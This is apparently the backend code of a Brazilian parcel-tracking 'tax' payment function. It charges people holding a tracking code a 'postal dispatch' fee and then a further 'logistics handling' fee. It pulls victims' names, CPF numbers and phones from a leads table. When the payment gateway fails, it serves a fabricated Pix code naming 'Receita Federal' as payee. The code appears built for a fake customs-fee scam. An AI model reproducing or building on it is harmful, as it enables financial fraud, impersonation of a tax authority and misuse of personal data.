import { serve } from "https://deno.land/std@0.190.0/http/server.ts"
import { createClient } from 'https://esm.sh/@supabase/supabase-js@2.45.0'

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
}

serve(async (req) => {
  if (req.method === 'OPTIONS') return new Response(null, { headers: corsHeaders })

  try {
    const { trackingCode } = await req.json();
    const supabase = createClient(Deno.env.get('SUPABASE_URL') ?? '', Deno.env.get('SUPABASE_SERVICE_ROLE_KEY') ?? '');

    const { data: payments } = await supabase.from('pix_gateway_payments').select('status').contains('raw_payload', { trackingCode });
    const paidCount = payments?.filter(p => p.status === 'paid').length || 0;

    // Novo código de teste de 1 Real
    const isOneRealTest = trackingCode === 'BR7777X777BR';
    let amount = paidCount >= 1 ? 9.90 : 19.90;
    if (isOneRealTest && paidCount === 0) amount = 1.00;

    const taxName = paidCount >= 1 ? "Taxa de Manuseio Logístico" : "Despacho Postal";
    const { data: lead } = await supabase.from('leads').select('*').eq('codigo_rastreio', trackingCode).maybeSingle();
    
    const apiKey = Deno.env.get('ROYALBANKING_API_KEY2') || Deno.env.get('ROYALBANKING_API_KEY');
    const callbackUrl = "https://ulrigywayovxuyiktnlr.supabase.co/functions/v1/royal-banking-webhook";

    const generateMockPix = async () => {
      const mockId = "mock_" + Date.now();
      const mockPix = "00020101021126580014br.gov.bcb.pix0136123e4567-e89b-12d3-a456-4266141740005204000053039865405" + amount.toFixed(2) + "5802BR5913Receita Federal6008Brasilia62140510TAXA" + Date.now() + "6304A1B2";
      await supabase.from('pix_gateway_payments').upsert({ id_transaction: mockId, status: 'pending', raw_payload: { trackingCode, amount, taxName, type: 'tax' } });
      return new Response(JSON.stringify({ success: true, pixCopiaECola: mockPix, idTransaction: mockId, amount, taxName }), { headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
    };

    if (!apiKey) return await generateMockPix();

    const response = await fetch("https://api.royalbanking.com.br/v1/gateway/", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        "api-key": apiKey,
        "amount": amount,
        "client": { 
          "name": lead?.nome || "Cliente Rastreio", 
          "document": (lead?.cpf || "12345678909").replace(/\D/g, ''), 
          "telefone": (lead?.telefone || "11999999999").replace(/\D/g, ''), 
          "email": lead?.email || "rastreio@email.com" 
        },
        "callbackUrl": callbackUrl
      })
    });

    const data = await response.json();
    if (!response.ok || data.status !== 'success') {
      console.error("[create-tax-pix] Erro no gateway:", data);
      return await generateMockPix();
    }

    await supabase.from('pix_gateway_payments').upsert({ 
      id_transaction: String(data.idTransaction), 
      status: 'pending', 
      raw_payload: { trackingCode, amount, taxName, type: 'tax' } 
    });

    return new Response(JSON.stringify({ 
      success: true, 
      pixCopiaECola: data.paymentCode, 
      idTransaction: data.idTransaction, 
      amount,
      taxName
    }), { headers: { ...corsHeaders, 'Content-Type': 'application/json' } });

  } catch (error: any) {
    console.error("[create-tax-pix] Erro crítico:", error);
    return new Response(JSON.stringify({ error: error.message }), { headers: corsHeaders, status: 500 });
  }
})